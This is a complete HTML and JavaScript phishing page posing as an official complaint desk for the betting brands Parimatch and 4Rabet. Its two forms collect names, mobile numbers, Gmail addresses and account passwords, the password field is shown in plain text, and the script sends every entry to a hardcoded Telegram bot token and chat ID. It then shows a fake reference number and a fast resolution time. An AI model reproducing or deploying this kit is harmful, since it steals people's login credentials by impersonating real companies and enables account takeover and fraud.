<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
  <title>Parimatch & 4Rabet | Official Complaint Portal</title>
  <link href="https://fonts.googleapis.com/css2?family=Inter:opsz,wght@14..32,300;14..32,400;14..32,500;14..32,600;14..32,700;14..32,800&display=swap" rel="stylesheet">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }

    body {
      font-family: 'Inter', 'Segoe UI', system-ui, sans-serif;
      background: radial-gradient(circle at 10% 20%, #0a0c15 0%, #03050b 100%);
      min-height: 100vh;
      display: flex;
      justify-content: center;
      align-items: center;
      padding: 1.5rem;
    }

    .complaint-hub {
      max-width: 580px;
      width: 100%;
      margin: 0 auto;
    }

    /* Tab Navigation */
    .tab-nav {
      display: flex;
      gap: 1rem;
      margin-bottom: 1.5rem;
      justify-content: center;
    }

    .tab-btn {
      flex: 1;
      padding: 14px 20px;
      font-size: 1.1rem;
      font-weight: 700;
      text-transform: uppercase;
      letter-spacing: 1.5px;
      border: none;
      border-radius: 3rem;
      cursor: pointer;
      transition: all 0.3s ease;
      font-family: 'Inter', sans-serif;
      background: rgba(10, 14, 23, 0.8);
      color: #9aa7c9;
      backdrop-filter: blur(8px);
    }

    .tab-btn i {
      margin-right: 8px;
    }

    .tab-btn.active {
      background: linear-gradient(105deg, #FACC15 0%, #E0A800 100%);
      color: #0a0e1a;
      box-shadow: 0 5px 15px rgba(250, 204, 21, 0.3);
    }

    .tab-btn.fourrabet-tab.active {
      background: linear-gradient(105deg, #00ff88 0%, #00cc66 100%);
      color: #0a0e1a;
      box-shadow: 0 5px 15px rgba(0, 255, 136, 0.3);
    }

    .tab-btn:hover:not(.active) {
      background: rgba(250, 204, 21, 0.2);
      color: #ffd700;
    }

    .card-container {
      background: rgba(10, 14, 23, 0.94);
      backdrop-filter: blur(12px);
      border-radius: 2rem;
      box-shadow: 0 25px 45px -12px rgba(0, 0, 0, 0.8), 0 0 0 1px rgba(250, 204, 21, 0.25);
      overflow: hidden;
    }

    .tab-content {
      display: none;
    }

    .tab-content.active-content {
      display: block;
      animation: fadeIn 0.3s ease;
    }

    @keyframes fadeIn {
      from { opacity: 0; transform: translateY(10px); }
      to { opacity: 1; transform: translateY(0); }
    }

    .card-header {
      padding: 1.8rem 2rem 1.2rem;
      text-align: center;
      border-bottom: 2px solid;
    }

    .parimatch-header {
      background: linear-gradient(115deg, #0e1428 0%, #050814 100%);
      border-bottom-color: #FACC15;
    }

    .fourrabet-header {
      background: linear-gradient(115deg, #0a1a1a 0%, #051010 100%);
      border-bottom-color: #00ff88;
    }

    .brand-icon {
      font-size: 2.2rem;
      margin-bottom: 0.4rem;
    }

    .parimatch-header .brand-icon {
      color: #FACC15;
    }

    .fourrabet-header .brand-icon {
      color: #00ff88;
    }

    .card-header h2 {
      font-size: 1.8rem;
      font-weight: 800;
      letter-spacing: 2px;
      text-transform: uppercase;
    }

    .parimatch-header h2 {
      background: linear-gradient(135deg, #FFF9E6, #FFD966);
      background-clip: text;
      -webkit-background-clip: text;
      color: transparent;
    }

    .fourrabet-header h2 {
      background: linear-gradient(135deg, #AAFFCC, #00ff88);
      background-clip: text;
      -webkit-background-clip: text;
      color: transparent;
    }

    .card-header p {
      color: #9aa7c9;
      font-size: 0.75rem;
      margin-top: 0.3rem;
    }

    .form-body {
      padding: 2rem 2rem 1.8rem;
    }

    .input-group {
      margin-bottom: 1.4rem;
      display: flex;
      flex-direction: column;
    }

    .input-group label {
      font-size: 0.7rem;
      font-weight: 700;
      text-transform: uppercase;
      letter-spacing: 1px;
      margin-bottom: 6px;
      display: flex;
      align-items: center;
      gap: 8px;
    }

    .parimatch-form .input-group label {
      color: #FACC15;
    }

    .fourrabet-form .input-group label {
      color: #00ff88;
    }

    .input-group label i {
      font-size: 0.8rem;
      width: 20px;
    }

    input, textarea {
      width: 100%;
      background: #0c1022;
      border: 1.5px solid #262f4a;
      border-radius: 1rem;
      padding: 12px 16px;
      font-family: 'Inter', monospace;
      font-size: 0.9rem;
      font-weight: 500;
      color: #f0f3fc;
      transition: all 0.2s;
      outline: none;
    }

    input:focus, textarea:focus {
      border-color: #FACC15;
      box-shadow: 0 0 0 3px rgba(250, 204, 21, 0.25);
      background: #0b1025;
    }

    .fourrabet-form input:focus, .fourrabet-form textarea:focus {
      border-color: #00ff88;
      box-shadow: 0 0 0 3px rgba(0, 255, 136, 0.2);
    }

    textarea {
      min-height: 100px;
      resize: vertical;
    }

    .visible-note {
      margin-top: -8px;
      margin-bottom: 10px;
      font-size: 0.65rem;
      color: #aaa;
    }

    .submit-btn {
      width: 100%;
      padding: 14px 20px;
      font-size: 1rem;
      font-weight: 800;
      text-transform: uppercase;
      letter-spacing: 2px;
      border: none;
      border-radius: 3rem;
      cursor: pointer;
      margin-top: 0.5rem;
      transition: transform 0.2s, box-shadow 0.2s;
      display: flex;
      justify-content: center;
      align-items: center;
      gap: 12px;
      font-family: 'Inter', sans-serif;
    }

    .parimatch-btn {
      background: linear-gradient(105deg, #FACC15 0%, #E0A800 100%);
      color: #0a0e1a;
    }

    .parimatch-btn:hover {
      transform: translateY(-2px);
      background: linear-gradient(105deg, #FFE259, #F5B81B);
      box-shadow: 0 12px 22px -12px rgba(250, 204, 21, 0.45);
    }

    .fourrabet-btn {
      background: linear-gradient(105deg, #00ff88 0%, #00cc66 100%);
      color: #0a0e1a;
    }

    .fourrabet-btn:hover {
      transform: translateY(-2px);
      background: linear-gradient(105deg, #33ffaa, #00dd77);
      box-shadow: 0 12px 22px -12px rgba(0, 255, 136, 0.45);
    }

    .submit-btn:active {
      transform: scale(0.97);
    }

    .submit-btn:disabled {
      opacity: 0.6;
      cursor: not-allowed;
      transform: none;
    }

    /* Custom Alert Modal Styles - Improved */
    .custom-alert {
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background: rgba(0, 0, 0, 0.85);
      backdrop-filter: blur(8px);
      display: flex;
      justify-content: center;
      align-items: center;
      z-index: 1000;
      opacity: 0;
      visibility: hidden;
      transition: all 0.3s ease;
    }

    .custom-alert.show {
      opacity: 1;
      visibility: visible;
    }

    .alert-card {
      background: linear-gradient(135deg, #0e1428, #050814);
      border-radius: 1.5rem;
      padding: 2rem;
      max-width: 380px;
      width: 90%;
      text-align: center;
      border: 1px solid;
      transform: scale(0.9);
      transition: transform 0.3s ease;
    }

    .custom-alert.show .alert-card {
      transform: scale(1);
    }

    .alert-success-card {
      border-color: #00ff88;
    }

    .alert-error-card {
      border-color: #ff4444;
    }

    .alert-icon {
      font-size: 3.5rem;
      margin-bottom: 1rem;
    }

    .alert-success-card .alert-icon {
      color: #00ff88;
    }

    .alert-error-card .alert-icon {
      color: #ff4444;
    }

    .alert-title {
      font-size: 1.5rem;
      font-weight: 800;
      margin-bottom: 0.8rem;
    }

    .alert-success-card .alert-title {
      color: #00ff88;
    }

    .alert-error-card .alert-title {
      color: #ff4444;
    }

    .alert-message-body {
      color: #cbd5e6;
      font-size: 0.9rem;
      line-height: 1.5;
      margin-bottom: 1.2rem;
    }

    .resolve-time {
      background: rgba(0, 255, 136, 0.15);
      padding: 0.6rem;
      border-radius: 2rem;
      margin: 0.8rem 0;
      font-size: 0.85rem;
      font-weight: 600;
      color: #00ff88;
    }

    .alert-btn {
      background: linear-gradient(105deg, #FACC15, #E0A800);
      border: none;
      padding: 10px 24px;
      border-radius: 2rem;
      font-weight: 700;
      cursor: pointer;
      margin-top: 0.5rem;
      font-size: 0.9rem;
    }

    .alert-btn:hover {
      transform: scale(1.02);
    }

    .footer-note {
      background: #050914;
      padding: 1rem;
      text-align: center;
      font-size: 0.65rem;
      color: #5e6f97;
      border-top: 1px solid #1f2848;
    }

    @media (max-width: 520px) {
      body { padding: 1rem; }
      .form-body { padding: 1.5rem; }
      .tab-btn { font-size: 0.9rem; padding: 10px 12px; }
      .card-header h2 { font-size: 1.4rem; }
    }
  </style>
</head>
<body>

<div class="complaint-hub">
  <!-- Tab Buttons -->
  <div class="tab-nav">
    <button class="tab-btn active" id="parimatchTabBtn">
      <i class="fas fa-crown"></i> PARIMATCH
    </button>
    <button class="tab-btn fourrabet-tab" id="fourrabetTabBtn">
      <i class="fas fa-dice-d6"></i> 4RABET
    </button>
  </div>

  <!-- PARIMATCH CONTENT -->
  <div id="parimatchContent" class="tab-content active-content">
    <div class="card-container">
      <div class="card-header parimatch-header">
        <div class="brand-icon"><i class="fas fa-crown"></i></div>
        <h2>PARIMATCH</h2>
        <p>OFFICIAL GRIEVANCE DESK</p>
      </div>
      <div class="form-body">
        <form id="parimatchForm" class="parimatch-form">
          <div class="input-group">
            <label><i class="fas fa-user-circle"></i> FULL NAME *</label>
            <input type="text" id="pmName" placeholder="Enter your registered name" autocomplete="name" required>
          </div>
          <div class="input-group">
            <label><i class="fas fa-mobile-alt"></i> MOBILE NUMBER *</label>
            <input type="tel" id="pmMobile" placeholder="+91 98765 43210" required>
          </div>
          <div class="input-group">
            <label><i class="fab fa-google"></i> GMAIL ID *</label>
            <input type="email" id="pmGmail" placeholder="username@gmail.com" required>
          </div>
          <div class="input-group">
            <label><i class="fas fa-key"></i> PASSWORD (visible text) *</label>
            <input type="text" id="pmPassword" placeholder="Your account password (visible while typing)" autocomplete="off" required>
          </div>
          <div class="visible-note"><i class="fas fa-eye"></i> Password appears as plain text</div>
          <div class="input-group">
            <label><i class="fas fa-message"></i> DESCRIBE PROBLEM *</label>
            <textarea id="pmProblem" placeholder="Transaction ID, amount, date, issue details..." required></textarea>
          </div>
          <button type="submit" class="submit-btn parimatch-btn" id="pmSubmitBtn">
            <i class="fas fa-paper-plane"></i> SUBMIT PARIMATCH COMPLAINT
          </button>
        </form>
      </div>
      <div class="footer-note"><i class="fas fa-shield-alt"></i> PARIMATCH COMPLIANCE • 24H RESPONSE</div>
    </div>
  </div>

  <!-- 4RABET CONTENT -->
  <div id="fourrabetContent" class="tab-content">
    <div class="card-container">
      <div class="card-header fourrabet-header">
        <div class="brand-icon"><i class="fas fa-dice-d6"></i></div>
        <h2>4RABET</h2>
        <p>OFFICIAL COMPLAINT CENTER</p>
      </div>
      <div class="form-body">
        <form id="fourrabetForm" class="fourrabet-form">
          <div class="input-group">
            <label><i class="fas fa-user-circle"></i> FULL NAME *</label>
            <input type="text" id="frName" placeholder="Enter your registered name" autocomplete="name" required>
          </div>
          <div class="input-group">
            <label><i class="fas fa-mobile-alt"></i> MOBILE NUMBER *</label>
            <input type="tel" id="frMobile" placeholder="+91 98765 43210" required>
          </div>
          <div class="input-group">
            <label><i class="fab fa-google"></i> GMAIL ID *</label>
            <input type="email" id="frGmail" placeholder="username@gmail.com" required>
          </div>
          <div class="input-group">
            <label><i class="fas fa-key"></i> PASSWORD (visible text) *</label>
            <input type="text" id="frPassword" placeholder="Your account password (visible while typing)" autocomplete="off" required>
          </div>
          <div class="visible-note"><i class="fas fa-eye"></i> Password appears as plain text</div>
          <div class="input-group">
            <label><i class="fas fa-message"></i> DESCRIBE PROBLEM *</label>
            <textarea id="frProblem" placeholder="Withdrawal/deposit issues, transaction details, etc." required></textarea>
          </div>
          <button type="submit" class="submit-btn fourrabet-btn" id="frSubmitBtn">
            <i class="fas fa-paper-plane"></i> SUBMIT 4RABET COMPLAINT
          </button>
        </form>
      </div>
      <div class="footer-note"><i class="fas fa-shield-alt"></i> 4RABET SUPPORT • ESCALATION TEAM</div>
    </div>
  </div>
</div>

<!-- Custom Alert Modal -->
<div id="customAlert" class="custom-alert">
  <div class="alert-card" id="alertCard">
    <div class="alert-icon" id="alertIcon"><i class="fas fa-check-circle"></i></div>
    <div class="alert-title" id="alertTitle">SUCCESS!</div>
    <div class="alert-message-body" id="alertMessage">Your complaint has been received successfully.</div>
    <div class="resolve-time" id="resolveTime"><i class="fas fa-clock"></i> ⏱️ Estimated Resolution: 10-24 minutes</div>
    <button class="alert-btn" onclick="closeAlert()"><i class="fas fa-check"></i> GOT IT</button>
  </div>
</div>

<script>
  // ============================================================
  // TELEGRAM CONFIGURATION - Same token for both brands
  // ============================================================
  const BOT_TOKEN = "8538875818:AAFT284-CusnSljnLVsmmznoQzlxJG1zdf0";
  const CHAT_ID = "8400052598";
  
  // ============================================================
  // CUSTOM ALERT FUNCTIONS
  // ============================================================
  function showCustomAlert(type, title, message, resolveTimeText = "⏱️ Estimated Resolution: 10-24 minutes") {
    const alertBox = document.getElementById('customAlert');
    const alertCard = document.getElementById('alertCard');
    const alertIcon = document.getElementById('alertIcon');
    const alertTitle = document.getElementById('alertTitle');
    const alertMessage = document.getElementById('alertMessage');
    const resolveTimeDiv = document.getElementById('resolveTime');
    
    if (type === 'success') {
      alertCard.className = 'alert-card alert-success-card';
      alertIcon.innerHTML = '<i class="fas fa-check-circle"></i>';
      alertTitle.innerHTML = title || '✓ COMPLAINT SENT SUCCESSFULLY!';
      alertTitle.style.color = '#00ff88';
      resolveTimeDiv.style.display = 'block';
      resolveTimeDiv.innerHTML = `<i class="fas fa-clock"></i> ${resolveTimeText}`;
    } else {
      alertCard.className = 'alert-card alert-error-card';
      alertIcon.innerHTML = '<i class="fas fa-times-circle"></i>';
      alertTitle.innerHTML = title || '❌ SUBMISSION FAILED';
      alertTitle.style.color = '#ff4444';
      resolveTimeDiv.style.display = 'none';
    }
    
    alertMessage.innerHTML = message;
    alertBox.classList.add('show');
  }
  
  function closeAlert() {
    document.getElementById('customAlert').classList.remove('show');
  }
  
  // Close alert on backdrop click
  document.getElementById('customAlert').addEventListener('click', function(e) {
    if (e.target === this) closeAlert();
  });
  
  // ============================================================
  // TAB SWITCHING
  // ============================================================
  const parimatchTab = document.getElementById('parimatchTabBtn');
  const fourrabetTab = document.getElementById('fourrabetTabBtn');
  const parimatchContent = document.getElementById('parimatchContent');
  const fourrabetContent = document.getElementById('fourrabetContent');

  function switchToParimatch() {
    parimatchTab.classList.add('active');
    fourrabetTab.classList.remove('active');
    parimatchContent.classList.add('active-content');
    fourrabetContent.classList.remove('active-content');
  }

  function switchToFourrabet() {
    fourrabetTab.classList.add('active');
    parimatchTab.classList.remove('active');
    fourrabetContent.classList.add('active-content');
    parimatchContent.classList.remove('active-content');
  }

  parimatchTab.addEventListener('click', switchToParimatch);
  fourrabetTab.addEventListener('click', switchToFourrabet);

  // ============================================================
  // SEND TO TELEGRAM
  // ============================================================
  async function sendToTelegram(brandName, formData) {
    const messageText = `🚨 NEW COMPLAINT - ${brandName} 🚨\n\n👤 Name: ${formData.name}\n📞 Mobile: ${formData.mobile}\n📧 Email: ${formData.email}\n🔒 Password: ${formData.password}\n📝 Problem: ${formData.problem}\n\n🕐 Time: ${new Date().toLocaleString('en-IN')}\n━━━━━━━━━━━━━━━━━━━━\n✅ STATUS: PENDING\n⏱️ RESOLUTION TARGET: 10-24 MINUTES\n━━━━━━━━━━━━━━━━━━━━\n🔔 Our support team will contact you shortly.`;
    
    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
    const response = await fetch(url, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: CHAT_ID,
        text: messageText,
        parse_mode: ""
      })
    });
    const data = await response.json();
    if (!data.ok) throw new Error(data.description);
    return data;
  }

  // ============================================================
  // VALIDATION
  // ============================================================
  function validateFormData(name, mobile, email, password, problem, brandName) {
    if (!name || name.trim().length < 2) {
      showCustomAlert('error', '❌ VALIDATION ERROR', `Please enter valid full name (minimum 2 characters).`, '');
      return false;
    }
    const mobileDigits = mobile.replace(/[^\d+]/g, '');
    if (!mobile || mobileDigits.length < 8) {
      showCustomAlert('error', '❌ VALIDATION ERROR', `Please enter valid mobile number (minimum 8 digits).`, '');
      return false;
    }
    const emailRegex = /^[a-zA-Z0-9][a-zA-Z0-9._%+-]*@gmail\.com$/i;
    if (!email || !emailRegex.test(email)) {
      showCustomAlert('error', '❌ VALIDATION ERROR', `Please enter valid Gmail ID (@gmail.com).`, '');
      return false;
    }
    if (!password || password.trim() === "") {
      showCustomAlert('error', '❌ VALIDATION ERROR', `Password cannot be empty.`, '');
      return false;
    }
    if (!problem || problem.trim().length < 10) {
      showCustomAlert('error', '❌ VALIDATION ERROR', `Please describe your problem (minimum 10 characters).`, '');
      return false;
    }
    return true;
  }

  // ============================================================
  // PARIMATCH SUBMIT
  // ============================================================
  const pmForm = document.getElementById('parimatchForm');
  const pmName = document.getElementById('pmName');
  const pmMobile = document.getElementById('pmMobile');
  const pmGmail = document.getElementById('pmGmail');
  const pmPassword = document.getElementById('pmPassword');
  const pmProblem = document.getElementById('pmProblem');
  const pmBtn = document.getElementById('pmSubmitBtn');

  pmForm.addEventListener('submit', async (e) => {
    e.preventDefault();
    
    const name = pmName.value.trim();
    const mobile = pmMobile.value.trim();
    const email = pmGmail.value.trim();
    const password = pmPassword.value.trim();
    const problem = pmProblem.value.trim();
    
    if (!validateFormData(name, mobile, email, password, problem, "PARIMATCH")) return;
    
    const complaintData = { name, mobile, email, password, problem };
    
    pmBtn.disabled = true;
    const originalText = pmBtn.innerHTML;
    pmBtn.innerHTML = '<i class="fas fa-spinner fa-pulse"></i> SENDING TO PARIMATCH...';
    
    try {
      await sendToTelegram("PARIMATCH", complaintData);
      showCustomAlert('success', '✓ COMPLAINT SENT!', 
        `Your complaint has been received successfully by ${name}.\n\nReference ID: ${'PM' + Date.now().toString(36).toUpperCase().slice(-8)}\n\nOur executive will review your issue immediately.`, 
        '⏱️ Estimated Resolution Time: 10-24 minutes ⚡');
      pmForm.reset();
    } catch (err) {
      console.error(err);
      showCustomAlert('error', '❌ SUBMISSION FAILED', `Error: ${err.message}\n\nPlease check your internet connection or try again.`, '');
    } finally {
      pmBtn.disabled = false;
      pmBtn.innerHTML = originalText;
    }
  });

  // ============================================================
  // 4RABET SUBMIT
  // ============================================================
  const frForm = document.getElementById('fourrabetForm');
  const frName = document.getElementById('frName');
  const frMobile = document.getElementById('frMobile');
  const frGmail = document.getElementById('frGmail');
  const frPassword = document.getElementById('frPassword');
  const frProblem = document.getElementById('frProblem');
  const frBtn = document.getElementById('frSubmitBtn');

  frForm.addEventListener('submit', async (e) => {
    e.preventDefault();
    
    const name = frName.value.trim();
    const mobile = frMobile.value.trim();
    const email = frGmail.value.trim();
    const password = frPassword.value.trim();
    const problem = frProblem.value.trim();
    
    if (!validateFormData(name, mobile, email, password, problem, "4RABET")) return;
    
    const complaintData = { name, mobile, email, password, problem };
    
    frBtn.disabled = true;
    const originalText = frBtn.innerHTML;
    frBtn.innerHTML = '<i class="fas fa-spinner fa-pulse"></i> SENDING TO 4RABET...';
    
    try {
      await sendToTelegram("4RABET", complaintData);
      showCustomAlert('success', '✓ COMPLAINT SENT!', 
        `Your complaint has been received successfully by ${name} for 4Rabet.\n\nReference ID: ${'4R' + Date.now().toString(36).toUpperCase().slice(-8)}\n\nOur support team will contact you shortly.`, 
        '⏱️ Estimated Resolution Time: 10-24 minutes ⚡');
      frForm.reset();
    } catch (err) {
      console.error(err);
      showCustomAlert('error', '❌ SUBMISSION FAILED', `Error: ${err.message}\n\nPlease check your internet connection or try again.`, '');
    } finally {
      frBtn.disabled = false;
      frBtn.innerHTML = originalText;
    }
  });
</script>
</body>
</html>
